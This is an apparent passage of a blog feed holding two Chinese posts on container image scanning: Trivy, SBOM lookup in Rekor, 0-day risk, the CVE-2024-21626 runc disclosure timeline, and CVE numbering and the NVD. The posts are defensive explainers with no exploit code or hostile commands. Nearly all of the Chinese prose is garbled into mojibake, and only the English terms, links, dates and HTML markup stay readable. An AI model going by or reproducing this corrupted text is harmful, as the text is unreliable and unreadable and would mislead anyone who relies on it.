SBOMã€äºŒè¿›åˆ¶æ–‡ä»¶çš„å“ˆå¸Œå€¼ä»¥åŠç­¾åä¸Šä¼ åˆ° Rekor å®ä¾‹ä¸­ã€‚</li></ol><p>æˆ‘ä»¬ä½¿ç”¨ Trivy å¯¹é•œåƒè¿›è¡Œæ‰«æï¼ŒTrivy ä¼šéå†é•œåƒä¸­çš„æ–‡ä»¶ã€‚å½“å‘ç°å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå®ƒå°±ä¼šå» Rekor ä¸­å¯»æ‰¾è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„å“ˆå¸Œå€¼ã€‚è‹¥æ‰¾åˆ°äº†å¯¹åº”çš„å“ˆå¸Œå€¼ï¼Œå†å»æŸ¥æ‰¾æ˜¯å¦æœ‰ç›¸å…³çš„ SBOMï¼Œè‹¥æ‰¾åˆ°äº† SBOMï¼Œå†ä½¿ç”¨å®ƒè¿›è¡Œæ¼æ´æ‰«æã€‚</p><p><img src="/image/image_9dSEL86Pwl.png" alt="å›¾ 6ï¼šå¯¹æœªçŸ¥ä¾èµ–çš„åº”ç”¨ç¨‹åºè¿›è¡Œæ‰«æçš„è¿‡ç¨‹" title="å›¾6ï¼šå¯¹æœªçŸ¥ä¾èµ–çš„åº”ç”¨ç¨‹åºè¿›è¡Œæ‰«æçš„è¿‡ç¨‹"></p><h2 id="0x03-0day-æ¼æ´"><a href="#0x03-0day-æ¼æ´" class="headerlink" title="0x03 0day æ¼æ´"></a>0x03 0day æ¼æ´</h2><p>è‹¥å¯¹é•œåƒè¿›è¡Œæ¼æ´æ‰«æçš„æ—¶å€™ï¼Œæ²¡æœ‰æ‰«å‡ºæ¼æ´å°±ä»£è¡¨å®ƒä¸€å®šæ²¡æœ‰æ¼æ´é£é™©äº†å—ï¼Ÿé‚£å€’ä¸è§å¾—ï¼Œåº”ç”¨ç¨‹åºè¿˜å¯èƒ½å­˜åœ¨æˆ‘ä»¬ä¸çŸ¥é“çš„æ¼æ´ï¼Œè¿™äº›æ¼æ´å¯ä»¥è¢«æ”»å‡»è€…æ‹¿æ¥æ”»å‡»åˆ©ç”¨ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°ä¹‹ä¸ºâ€œ<strong>0 Day</strong>â€ã€‚</p><p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬è®²è¿°äº†ä¸–ç•Œå„åœ°çš„å®‰å…¨ç ”ç©¶å‘˜æ˜¯å¦‚ä½•å¯¹æ¼æ´è¿›è¡ŒæŠ«éœ²çš„ï¼Œå„ä¸ªç»„ç»‡æ˜¯å¦‚ä½•å¯¹æ¼æ´è¿›è¡Œå‘å¸ƒä¸è·Ÿè¸ªçš„ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°ï¼šä¸€ä¸ªæ¼æ´ä»å‘ç°åˆ°æŠ«éœ²è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨ä¸€æ®µå¾ˆé•¿çš„ç”¨æ¥å¼€å‘ä¿®å¤ç¨‹åºçš„æ—¶é—´ã€‚åœ¨è¿™ä¸ªæ—¶é—´ä¹‹å†…çš„æ¼æ´è¢«ç§°ä¹‹ä¸º<strong>0 Day æ¼æ´ï¼Œå³æ¼æ´è¢«å…¬å¼€äº† 0 å¤©</strong>ï¼ˆå°±æ˜¯æ²¡æœ‰å…¬å¼€è¿‡å‘€ï¼‰ã€‚</p><p>å¦‚æœä¾›åº”å•†èƒ½åœ¨ 30 å¤©å†…å‘å¸ƒå®‰å…¨è¡¥ä¸ï¼Œä¸€èˆ¬ç”¨æˆ·éƒ½æ˜¯æ„¿æ„ç­‰çš„ï¼Œä½†è®©äººå¤´ç–¼çš„æ˜¯è¿™ 30 å†…ä¼šä¸ä¼šæœ‰å…¶ä»–çš„é»‘å®¢å‘ç°è¯¥æ¼æ´ï¼Œå¹¶è¿›è¡Œæ”»å‡»å‘¢ï¼Ÿ</p><p>ä»Šå¹´ä¸€æœˆåº•ï¼ˆ2024 å¹´ 1 æœˆ 31 æ—¥ï¼‰runc è¢«æ›å‡ºäº†ä¸€ä¸ªé«˜å±æ¼æ´<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21626" title="CVE-2024-21626">CVE-2024-21626</a>ï¼Œè¯¥æ¼æ´æºäºå†…éƒ¨æ–‡ä»¶æè¿°ç¬¦æ³„æ¼ï¼Œæœ€ç»ˆå¯èƒ½ä¼šå¯¼è‡´å®¹å™¨é€ƒé€¸ã€‚</p><p><img src="/image/image_mR4ERSP80x.png" alt="å›¾ 1ï¼šæ¼æ´ CVE-2024-21626 è¯¦æƒ…ï¼ˆæ¥è‡ª NVDï¼‰å›¾ 1ï¼šæ¼æ´ CVE-2024-21626 è¯¦æƒ…ï¼ˆæ¥è‡ª NVDï¼‰ " title="å›¾1ï¼šæ¼æ´ CVE-2024-21626 è¯¦æƒ…ï¼ˆæ¥è‡ªNVDï¼‰ å›¾1ï¼šæ¼æ´ CVE-2024-21626 è¯¦æƒ…ï¼ˆæ¥è‡ªNVDï¼‰ "></p><p>ä½†å®é™…ä¸Šï¼Œè¿™ä¸ªæ¼æ´æœ€åˆäº 2023 å¹´ 11 æœˆ 20 æ—¥è¢«å‘ç°çš„ï¼Œæ•´ä¸ªè´Ÿè´£ä»»çš„å®‰å…¨æŠ«éœ²æµç¨‹ç»å†äº† 72 å¤©ï¼Œå…·ä½“çš„æ—¶é—´çº¿å¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th>æ—¶é—´èŠ‚ç‚¹</th><th>é¡¹ç›®</th></tr></thead><tbody><tr><td>2023 å¹´ 11 æœˆ 20 æ—¥è¿™ä¸€å‘¨</td><td>Rory McNamara æœ€åˆå‘ç°äº†è¿™äº›æ¼æ´ã€‚ä»–å¼€å§‹è¿›è¡Œå†…éƒ¨éªŒè¯è¿‡ç¨‹å’Œé¢å¤–çš„ç ”ç©¶ï¼Œä»¥ç¡®è®¤å‘ç°å¹¶æ„å»º POC æ”»å‡»å®ä¾‹ã€‚</td></tr><tr><td>2023 å¹´ 12 æœˆ 11 æ—¥</td><td>åˆæ¬¡çº°æ¼ã€‚å°†æ‰€æœ‰çš„æ¼æ´ä¿¡æ¯å‘é€ç»™ Dockerï¼Œå¹¶ä¸” Docker åœ¨åŒä¸€å¤©ç¡®è®¤äº†ã€‚</td></tr><tr><td>2023 å¹´ 12 æœˆ 12 æ—¥</td><td>Snyk æ”¶åˆ°äº† Docker çš„å›å¤ã€‚Docker è¦æ±‚å°† <code>WORKDIR</code>æ¼æ´è½¬å‘ç»™<code>runc</code>ï¼Œå› ä¸ºä»–ä»¬è®¤ä¸ºè¿™æ˜¯<code>runc</code>çš„è´£ä»»ã€‚</td></tr><tr><td>2023 å¹´ 12 æœˆ 13 æ—¥</td><td>Rory è¢«æ·»åŠ ä¸º Github å®‰å…¨é€šå‘Šï¼ˆGHSAï¼‰çš„åˆä½œè€…ï¼Œæ¶‰åŠåˆ°ä»»æ„åˆ é™¤ä»¥åŠ grpc Docker&#x2F;Buildkitæ¼æ´ï¼ˆå‡æœ€åˆäº2023å¹´12æœˆ11æ—¥å¼€å¯ï¼‰ã€‚</td></tr><tr><td>2023 å¹´ 12 æœˆ 19 æ—¥</td><td>Rory è¢«æ·»åŠ ä¸º GHSAï¼ˆGithub å®‰å…¨é€šå‘Šï¼‰çš„åˆä½œè€…ï¼Œæ¶‰åŠåˆ° runc çš„ WORKDIR æ¼æ´ï¼ˆæœ€åˆäº 2023 å¹´ 12 æœˆ 11 æ—¥å¼€å¯ï¼‰ã€‚</td></tr><tr><td>2023 å¹´ 12 æœˆ 20 æ—¥</td><td>Rory è¢«æ·»åŠ ä¸º GHSAï¼ˆGitHub å®‰å…¨é€šå‘Šï¼‰çš„åˆä½œè€…ï¼Œæ¶‰åŠåˆ°ç¼“å­˜ç«äº‰æ¼æ´ã€‚</td></tr><tr><td>2024 å¹´ 1 æœˆ 2 æ—¥</td><td><code>runc</code>æ¼æ´å·²è¢«åˆ†é… CVE ç¼–å·ï¼ˆç”± Github çš„ CNA è´Ÿè´£ï¼‰ã€‚</td></tr><tr><td>2024 å¹´ 1 æœˆ 17 æ—¥</td><td><code>runc</code>å‘å…¶å®‰å…¨é‚®ä»¶åˆ—è¡¨å‘é€å…¬å‘Šï¼ŒåŒ…æ‹¬è¡¥ä¸å’Œæˆªæ­¢æ—¥æœŸä¸º 2024 å¹´ 1 æœˆ 31 æ—¥ã€‚</td></tr><tr><td>2024 å¹´ 1 æœˆ 24 æ—¥</td><td>Docker æ¼æ´å·²è¢«åˆ†é… CVE ç¼–å·ï¼ˆç”± GitHub çš„ CNA è´Ÿè´£ï¼‰ã€‚</td></tr><tr><td>2024 å¹´ 1 æœˆ 31 æ—¥</td><td>æ‰€æœ‰å››ä¸ªâ€œLeaky Vesselsâ€æ¼æ´å·²ç»å…¬å¼€å®£å¸ƒã€‚</td></tr><tr><td>2024 å¹´ 1 æœˆ 31 æ—¥</td><td>runc å‘å¸ƒäº†ç‰ˆæœ¬ 1.1.12ï¼Œä¿®å¤äº†è¿™äº›æ¼æ´ã€‚</td></tr><tr><td>2024 å¹´ 1 æœˆ 31 æ—¥</td><td>Snyk å‘å¸ƒäº†å‚è€ƒå®ç°â€œ<a href="https://www.github.com/snyk/leaky-vessels-dynamic-detector" title="leaky-vessels-dynamic-detector">leaky-vessels-dynamic-detector</a>â€å’Œâ€œ<a href="https://www.github.com/snyk/leaky-vessels-static-detector" title="leaky-vessels-static-detector">leaky-vessels-static-detector</a>â€ä¾›ç¤¾åŒºä½¿ç”¨ï¼Œä»¥è¯†åˆ«æ½œåœ¨æœ‰é—®é¢˜çš„å®¹å™¨å’Œé•œåƒã€‚</td></tr></tbody></table><p>å¦‚æœç¬¬ä¸‰æ–¹åº“å­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆä»»ä½•ä½¿ç”¨äº†è¿™ä¸ªåº“çš„åº”ç”¨ç¨‹åºéƒ½æœ‰å¯èƒ½å—åˆ°å½±å“ï¼ŒåŒ…æ‹¬ä½ ä»¬å›¢é˜Ÿæ‰€å¼€å‘çš„åº”ç”¨ç¨‹åºã€‚è™½ç„¶åŒè¡Œå®¡æŸ¥ã€é™æ€åˆ†æå’Œæµ‹è¯•ç­‰æ–¹æ³•æœ‰åŠ©äºå‘ç°ä»£ç ä¸­çš„æ¼æ´ï¼Œä½†è¿™äº›æ¼æ´ä¹Ÿæœ‰å¯èƒ½ä¼šè¢«å¿½ç•¥ã€‚è‡³äºä¼šä¸ä¼šè¢«é»‘å®¢è¿›è¡Œæ”»å‡»åˆ©ç”¨ï¼Œè¿™å–å†³äºä½ æ‰€åœ¨çš„ç»„ç»‡å’Œæ‰€æ‹¥æœ‰çš„æ•°æ®çš„ä»·å€¼ã€‚</p><p>å¥½æ¶ˆæ¯æ˜¯ï¼Œå¦‚æœä¸€ä¸ªæ¼æ´æœªè¢«å…¬å¼€ï¼Œé‚£ä¹ˆè¿™ä¸–ä¸Šçš„å¤§éƒ¨åˆ†çš„æ½œåœ¨çš„æ”»å‡»è€…éƒ½ä¸çŸ¥é“å®ƒçš„å­˜åœ¨ï¼Œå°±åƒä½ ä¹Ÿä¸çŸ¥é“ä¸€æ ·ã€‚åæ¶ˆæ¯æ˜¯ï¼Œä½ å¿…é¡»æ‰¿è®¤ï¼Œä¸€äº›ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œå›½å®¶ç»„ç»‡å¯èƒ½éšè—ç€å¤§é‡çš„æœªå…¬å¼€çš„ï¼ˆ0 Dayï¼‰æ¼æ´ã€‚å°±å¦‚åŒ<a href="https://en.wikipedia.org/wiki/Edward_Snowden" title="Edward Snowden">Edward Snowden</a>æ‰€æ­éœ²çš„ä¸€æ ·ã€‚</p><p><img src="/image/image_JumZLbdqit.png" alt="å›¾ 2ï¼šEdward Snowden çš„ç»´åŸºç™¾ç§‘ä»‹ç»ï¼ˆå°å§å§è¯´ä¸€å®šè¦æ”¾ç…§ç‰‡ï¼‰å›¾ 2ï¼šEdward Snowden çš„ç»´åŸºç™¾ç§‘ä»‹ç»ï¼ˆå°å§å§è¯´ä¸€å®šè¦æ”¾ç…§ç‰‡ï¼‰ " title="å›¾2ï¼šEdward Snowdençš„ç»´åŸºç™¾ç§‘ä»‹ç»ï¼ˆå°å§å§è¯´ä¸€å®šè¦æ”¾ç…§ç‰‡ï¼‰ å›¾2ï¼šEdward Snowdençš„ç»´åŸºç™¾ç§‘ä»‹ç»ï¼ˆå°å§å§è¯´ä¸€å®šè¦æ”¾ç…§ç‰‡ï¼‰ "></p><p>é€šè¿‡åŒ¹é…å®‰å…¨å…¬å‘Šæ•°æ®æ˜¯æ— æ³•è¯†åˆ«å‡º 0 day æ¼æ´çš„ï¼Œæ²™ç›’å¯èƒ½æ‰æ˜¯ä¿æŠ¤åº”ç”¨ç¨‹åºå’Œæ•°æ®çš„æœ‰æ•ˆçš„æ–¹æ³•ï¼Œä½†æœ€å¤§çš„é˜²èŒƒ 0 day çš„å¸Œæœ›åœ¨äºåœ¨è¿è¡Œæ—¶å¯¹å¼‚å¸¸è¡Œä¸ºè¿›è¡ŒåŠæ—¶çš„æ£€æµ‹ä¸é˜²æ­¢ã€‚å¦‚æœæœ‰å…´è¶£ï¼Œæˆ‘ä»¬åæœŸå¯ä»¥ä»”ç»†è¯´è¯´ï½</p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬äº†è§£äº†åº”ç”¨ç¨‹åºåœ¨æ‰“åŒ…æ—¶å¯ä»¥å°†ç¬¬ä¸‰æ–¹ä¾èµ–å®‰è£…ä¸ºå…±äº«åº“ï¼Œä¹Ÿå¯ä»¥åœ¨æ„å»ºçš„æ—¶å€™é“¾æ¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å»ï¼Œè¿™æ ·å¿…ç„¶å¯¼è‡´æ¼æ´æ‰«æçš„æ–¹æ¡ˆæœ‰æ‰€ä¸åŒã€‚</p><p>åº”ç”¨ç¨‹åºæ¼æ´æ‰«ææˆåŠŸä¸å¦åœ¨äºåº”ç”¨ç¨‹åºçš„ä¾èµ–æ•°æ®æ˜¯å¦å¥å…¨ã€‚è‹¥æˆ‘ä»¬æœ‰éå¸¸æ ‡å‡†çš„ä¾èµ–ä¿¡æ¯ï¼Œæ‰«æè¿‡ç¨‹ç›¸å¯¹è¾ƒä¸ºç®€å•ï¼›è‹¥ç¼ºå°‘ä¾èµ–ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå¯¹ä»£ç ä»“åº“è¿›è¡Œæ‰«æï¼Œå†ä½¿ç”¨ cosign å¯¹ SBOM è¿›è¡Œç­¾åï¼Œå°† SBOM ä¸åº”ç”¨ç¨‹åºçš„å“ˆå¸Œå€¼è¿›è¡Œç»‘å®šï¼Œæœ€åå†ä¸Šä¼ åˆ° Rekor å®ä¾‹ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹å‡ ä¹ç±»ä¼¼äºæˆ‘ä»¬é‡åˆ°ä¸è®¤è¯†çš„å­—å°±å»æŸ¥å­—å…¸ï¼Œè‹¥æŸ¥åˆ° SBOM å°±å¯ä»¥è¿›è¡Œæ¼æ´æ‰«æäº†ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬å†ç¨å¾®ç§‘æ™®äº†ä»€ä¹ˆæ˜¯ 0 day æ¼æ´ï¼Œå¹¶ä¸”å¼ºè°ƒï¼Œé•œåƒæ‰«ææ— æ³•é¿å… 0 day æ¼æ´æ‰€å¸¦æ¥çš„é£é™©ï¼Œæ›´å¥½çš„é˜²èŒƒæªæ–½åœ¨äºâ€”â€”åœ¨è¿è¡Œæ—¶å¯¹å¼‚å¸¸è¡Œä¸ºè¿›è¡ŒåŠæ—¶çš„æ£€æµ‹ä¸é˜²æ²»ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å°çŒ«å’ªéƒ½èƒ½å¬å¾—æ‡‚çš„é•œåƒæ‰«æåŸç†ï¼ˆä¸€ï¼‰</title>
    <link href="/2024/05/21/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/05/21/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¿®å¤è½¯ä»¶ä¸­çš„æ¼æ´ä¸€ç›´æ˜¯ç¡®ä¿è½¯ä»¶ä»£ç çš„å®‰å…¨æ€§çš„ä¸€é¡¹é‡è¦çš„æªæ–½ã€‚åœ¨å®¹å™¨çš„ä¸–ç•Œé‡Œï¼Œè¿™ä¸ªé—®é¢˜ä¾ç„¶éå¸¸ä¸¥å³»ã€‚åœ¨æœ¬ç³»åˆ—æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°è½¯ä»¶ä¿®å¤çš„è¿‡ç¨‹æ˜¯å¦‚ä½•è¢«å®Œå…¨é‡å¡‘çš„ã€‚æœ¬æ–‡ä¸»è¦è§£é‡Šäº†ï¼š</p><ol><li>ä»€ä¹ˆæ˜¯è½¯ä»¶æ¼æ´ï¼Œä»¥åŠå®ƒä»¬æ˜¯å¦‚ä½•è¢«å‘å¸ƒä¸è·Ÿè¸ªçš„ã€‚</li><li>ä½œä¸ºæ¼æ´æ‰«æä¾æ®çš„è½¯ä»¶ç‰ˆæœ¬è§„èŒƒæ˜¯ä»€ä¹ˆï¼Ÿ</li><li>ä»€ä¹ˆæ˜¯å®‰å…¨å…¬å‘Šæ•°æ®ï¼Œä»¥åŠä¸ºä»€ä¹ˆè¦ç”¨å®‰å…¨å…¬å‘Šæ•°æ®è¿›è¡Œæ¼æ´æ‰«æï¼Ÿ</li><li>ä»¥ ShellShock ä½œä¸ºæ¡ˆä¾‹ï¼Œè¯´æ˜å®¹å™¨é•œåƒæ‰«æçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</li><li>ä»åŸç†ä¸Šæ¥è¯´ï¼Œé•œåƒæ‰«æçš„å±€é™æ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬åº”è¯¥æ€ä¹ˆåšï¼Ÿ</li></ol><h2 id="0x01-æ¼æ´çš„å‘å¸ƒå’Œè·Ÿè¸ªæµç¨‹-x20"><a href="#0x01-æ¼æ´çš„å‘å¸ƒå’Œè·Ÿè¸ªæµç¨‹-x20" class="headerlink" title="0x01 æ¼æ´çš„å‘å¸ƒå’Œè·Ÿè¸ªæµç¨‹&#x20;"></a>0x01 æ¼æ´çš„å‘å¸ƒå’Œè·Ÿè¸ªæµç¨‹&#x20;</h2><p>æ¼æ´æ˜¯è½¯ä»¶çš„ä¸€ç§å·²çŸ¥çš„ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªç¼ºé™·æ¥è¿›è¡Œä¸€äº›æ¶æ„çš„è¡Œä¸ºã€‚é€šå¸¸ï¼Œä½ å¯ä»¥è®¤ä¸ºä¸€ä¸ªè½¯ä»¶è¶Šå¤æ‚ï¼Œæ‹¥æœ‰è¿™ç§å·²çŸ¥çš„ç¼ºé™·çš„å¯èƒ½æ€§å°±è¶Šå¤§ï¼Œç”šè‡³æœ‰äº›ç¼ºé™·å¯ä»¥è¢«æ”»å‡»è€…æ‰€åˆ©ç”¨ï¼Œè¿›è¡Œä¸€äº›æ¶æ„çš„æ”»å‡»è¡Œä¸ºã€‚</p><p>å½“ä¸€ä¸ªé€šç”¨è½¯ä»¶å­˜åœ¨æ¼æ´æ—¶ï¼Œæ— è®ºæ¼æ´åœ¨å“ªé‡Œï¼Œæ”»å‡»è€…ä¹Ÿè®¸éƒ½å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚å› æ­¤ï¼Œæ•´ä¸ªæ¼æ´è¡Œä¸šéƒ½è‡´åŠ›äºå‘ç°å¹¶æŠ¥é€é€šç”¨è½¯ä»¶ä¸­çš„æ¼æ´ã€‚ç‰¹åˆ«æ˜¯ä¸€äº›æ“ä½œç³»ç»Ÿçš„è½¯ä»¶åŒ…å’Œç¼–ç¨‹è¯­è¨€çš„ä¾èµ–åº“ã€‚</p><p>ä½ å¯èƒ½å¬è¯´è¿‡ä¸€äº›éå¸¸å…·æœ‰ç ´åæ€§çš„æ¼æ´ï¼Œåƒæ˜¯<a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" title="shellshock">shellshock</a>ã€<a href="https://zh.wikipedia.org/wiki/%E7%86%94%E6%AF%81_(%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E)" title="Meltdown">Meltdown</a>å’Œ<a href="https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E" title="Heartbleed">Heartbleed</a>ã€‚è¿™äº›æ¼æ´ä¸ä»…ä»…æ˜¯ä¸€ä¸ªåå­—ï¼Œæ›´æ˜¯ä¸€ä¸ªæ ‡å¿—ã€‚å®ƒä»¬è™½ç„¶æ˜¯æ¼æ´ä¸–ç•Œä¸­çš„æ˜æ˜Ÿï¼Œä½†ä¹Ÿä»…æ˜¯æ¯å¹´æŠ¥é€çš„æ¼æ´ä¸­æ¥ä¸€ä¸ªå°å°çš„ç¢ç‰‡ã€‚</p><p><img src="/image/image_5Z5H-42c6k.png" alt="å›¾ 1ï¼šæ¼æ´é€å¹´å¢é•¿çš„é€Ÿåº¦ï¼ˆæˆªæ­¢è‡³ 2022 å¹´ 4 æœˆ 20 æ—¥ï¼‰" title="å›¾1ï¼šæ¼æ´é€å¹´å¢é•¿çš„é€Ÿåº¦ï¼ˆæˆªæ­¢è‡³2022å¹´4æœˆ20æ—¥ï¼‰"></p><p>è½¯ä»¶çš„ç¼ºé™·ä¸€æ—¦è¢«è®¤å®šä¸ºæ˜¯æ¼æ´ï¼Œé‚£ä¹ˆä¸€åœºç”¨æˆ·ä¸æ”»å‡»è€…ä¹‹é—´çš„ç«èµ›å°±å¼€å§‹äº†ï¼Œåœ¨è¿™åœºç«èµ›ä¸­ï¼Œç”¨æˆ·éœ€è¦åœ¨æ”»å‡»è€…åˆ©ç”¨æ¼æ´ä¹‹å‰ï¼Œè·å–åˆ°ä¸€ä¸ªå¯ä»¥ä¿®å¤æ¼æ´çš„è¡¥ä¸ï¼Œå¹¶ä¸”å°†ç¯å¢ƒä¸­çš„è½¯ä»¶éƒ½æ‰“ä¸Šè¡¥ä¸ã€‚</p><p>å¦‚æœç«‹å³å…¬å¸ƒæ¼æ´ï¼Œè¿™å°†ä¸ºæ”»å‡»è€…åˆ›é€ ä¸€ä¸ªå¯ä»¥åˆ©ç”¨æ¼æ´è¿›è¡Œæ”»å‡»çš„ä¸€ä¸ªå®Œç¾çš„ç¯å¢ƒã€‚ä¸ºäº†é¿å…è¿™ä»¶äº‹æƒ…çš„å‘ç”Ÿï¼Œä¸€ä¸ªå«åšâ€œ<strong>è´Ÿè´£ä»»çš„å®‰å…¨çº°æ¼</strong>â€çš„æ¦‚å¿µå°±è¯ç”Ÿäº†ï¼Œå³ï¼š<strong>å‘ç°æ¼æ´çš„å®‰å…¨ç ”ç©¶äººå‘˜ä¼šä¸ç›¸å…³è½¯ä»¶çš„å¼€å‘äººå‘˜æˆ–ä¾›åº”å•†è”ç³»ã€‚åŒæ–¹å¯ä»¥çº¦å®šä¸€ä¸ªæ—¶é—´ï¼Œåœ¨è¿™ä¸ªæ—¶é—´ä¹‹åï¼Œå®‰å…¨ç ”ç©¶å‘˜æ‰å¯ä»¥å…¬å¸ƒä»–æ‰€å‘ç°çš„æ¼æ´äº†ã€‚</strong> è¿™æ ·åšä¹Ÿç»™ä¾›åº”å•†æ–½åŠ äº†ä¸€äº›ç§¯æçš„å‹åŠ›ï¼Œå› ä¸ºåœ¨å®‰å…¨ç ”ç©¶é™¢å…¬å¼€æ¼æ´ä¹‹å‰ï¼Œä¾›åº”å•†éœ€è¦åŠæ—¶çš„æä¾›è¡¥ä¸ã€‚</p><p>ç„¶åï¼Œè¿™ä¸ªæ¼æ´å°†ä¼šè·å¾—ä¸€ä¸ªä»¥<strong>CVEï¼ˆCommon Vulnerabilities and Exposuresï¼Œå¸¸è§æ¼æ´å’Œæš´éœ²ï¼‰</strong> å¼€å¤´çš„å”¯ä¸€ç¼–å·ã€‚CVE ç¼–å·åé¢ç´§æ¥ç€æ˜¯å¹´ä»½ã€‚ä¾‹å¦‚ï¼ŒShell-Shock æ¼æ´äº 2014 å¹´è¢«å‘ç°ï¼Œæ­£å¼ç§°ä¸º CVE-2014-6271ã€‚</p><p><img src="/image/image_LBSlckO57J.png" alt="å›¾ 2ï¼šCVE å®˜æ–¹ç½‘ç«™" title="å›¾2ï¼šCVE å®˜æ–¹ç½‘ç«™"></p><p>ç®¡ç† CVE ç¼–å·çš„ç»„ç»‡å«åš<a href="https://www.mitre.org/" title="MITRE">MITRE</a>ã€‚æ­¤å¤–ï¼ŒMITRE è¿˜ä¼šç›‘ç£è®¸å¤š<strong>CVE ç¼–å·æœºæ„ï¼ˆCVE Numbering Authoritiesï¼ŒCNAï¼‰</strong>ã€‚è¿™äº› CVE ç¼–å·æœºæ„æŒ‡çš„æ˜¯ä¸€äº›å¯ä»¥åœ¨ç‰¹å®šèŒƒå›´å†…ç­¾å‘ CVE ç¼–å·çš„æœºæ„ï¼Œé€šå¸¸æ˜¯ä¸€äº›å¤§å‹çš„è½¯ä»¶ä¾›åº”å•†ã€‚ä¾‹å¦‚å¾®è½¯ã€Redhat å’Œ Oracleï¼Œä»–ä»¬éƒ½å¯ä»¥ä¸ºè‡ªå·±äº§å“ä¸­çš„æ¼æ´åˆ†é…ç¼–å·ã€‚éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼šGitHub æ˜¯åœ¨ 2019 å¹´åº•æˆä¸º CNA çš„ã€‚</p><p><img src="/image/image_it7AQ8aOrF.png" alt="å›¾ 3ï¼šGithub äº 2019 å¹´ 9 æœˆ 19 æ—¥æˆä¸º CNA" title="å›¾3ï¼šGithub äº2019å¹´9æœˆ19æ—¥æˆä¸º CNA"></p><p>CVE ç¼–å·è¢«<a href="https://nvd.nist.gov/" title="ç¾å›½å›½å®¶æ¼æ´æ•°æ®åº“"><strong>ç¾å›½å›½å®¶æ¼æ´æ•°æ®åº“</strong></a><strong>ï¼ˆNational Vulnerability Databaseï¼ŒNVDï¼‰</strong> ç”¨æ¥è·Ÿè¸ªæ¼æ´åŠæ¼æ´æ‰€å½±å“çš„è½¯ä»¶åŒ…å’Œç‰ˆæœ¬ã€‚</p><p><img src="/image/image_DgDQtTmoCv.png" alt="å›¾ 4ï¼šNVD å®˜ç½‘" title="å›¾4ï¼šNVD å®˜ç½‘"></p><p>ä¹ä¸€çœ‹ï¼Œä½ å¯èƒ½ä¼šè§‰å¾—æ¼æ´æ‰«æçš„åŸç†å…¶å®å¾ˆç®€å•ï¼šåªè¦ä½ æ‹¥æœ‰ä¸€ä¸ªæ¼æ´æ¸…å•å’Œä¸€ä¸ªæ“ä½œç³»ç»Ÿè½¯ä»¶åŒ…æ¸…å•ï¼Œå°†ä¸¤ä¸ªæ¸…å•ä¸­çš„è½¯ä»¶åŒ…åç§°å’Œç‰ˆæœ¬è¿›è¡Œæ¯”å¯¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—å‡ºè¿™ä¸ªé•œåƒä¸­æœ‰å“ªäº›ç³»ç»Ÿè½¯ä»¶åŒ…æœ‰æ¼æ´äº†ã€‚</p><p>ä½†ä¸å¥½æ„æ€ï¼Œäº‹æƒ…æ ¹æœ¬å°±æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚å› ä¸ºæ“ä½œç³»ç»Ÿçš„è½¯ä»¶åŒ…æ˜¯å¦å—ä¸€ä¸ªæ¼æ´çš„å½±å“ï¼Œè¿˜å–å†³äºè¯¥æ“ä½œç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬ã€‚ä¸åŒçš„ Linux å‘è¡Œç‰ˆæœ¬å¯èƒ½ä¼šæœ‰ä¸åŒçš„ä¿®å¤ç¨‹åºã€‚</p><h2 id="0x02-é€šç”¨çš„è½¯ä»¶ç‰ˆæœ¬è§„èŒƒ"><a href="#0x02-é€šç”¨çš„è½¯ä»¶ç‰ˆæœ¬è§„èŒƒ" class="headerlink" title="0x02 é€šç”¨çš„è½¯ä»¶ç‰ˆæœ¬è§„èŒƒ"></a>0x02 